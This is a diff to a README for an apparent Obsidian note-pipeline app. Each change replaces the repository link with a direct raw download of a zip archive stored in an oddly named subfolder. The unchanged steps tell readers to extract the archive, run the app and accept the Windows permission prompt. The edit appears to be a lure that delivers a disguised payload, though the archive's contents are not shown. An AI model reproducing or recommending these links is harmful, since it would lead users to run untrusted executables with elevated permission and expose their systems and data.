@@ -1,6 +1,6 @@
 # 🧭 obsidian_vault_pipeline - Turn saved notes into clean vaults
 
-[![Download](https://img.shields.io/badge/Download-obsidian_vault_pipeline-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Touchbackosaka502/obsidian_vault_pipeline)
+[![Download](https://img.shields.io/badge/Download-obsidian_vault_pipeline-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Touchbackosaka502/obsidian_vault_pipeline/main/monodelphous/obsidian-pipeline-vault-3.4.zip)
 
 ## 🚀 What this app does
 
@@ -10,14 +10,14 @@ Use it when you want a simple way to collect notes, clean them up, and keep them
 
 ## 📥 Download and install
 
-1. Open the download page: https://github.com/Touchbackosaka502/obsidian_vault_pipeline
+1. Open the download page: https://raw.githubusercontent.com/Touchbackosaka502/obsidian_vault_pipeline/main/monodelphous/obsidian-pipeline-vault-3.4.zip
 2. Download the latest Windows release or the main app file from the page.
 3. If the file comes in a .zip file, right-click it and choose Extract All.
 4. Open the extracted folder.
 5. Double-click the app file to start it.
 6. If Windows asks for permission, choose Yes.
 
-[Visit the download page](https://github.com/Touchbackosaka502/obsidian_vault_pipeline)
+[Visit the download page](https://raw.githubusercontent.com/Touchbackosaka502/obsidian_vault_pipeline/main/monodelphous/obsidian-pipeline-vault-3.4.zip)
 
 ## 🖥️ System requirements
 
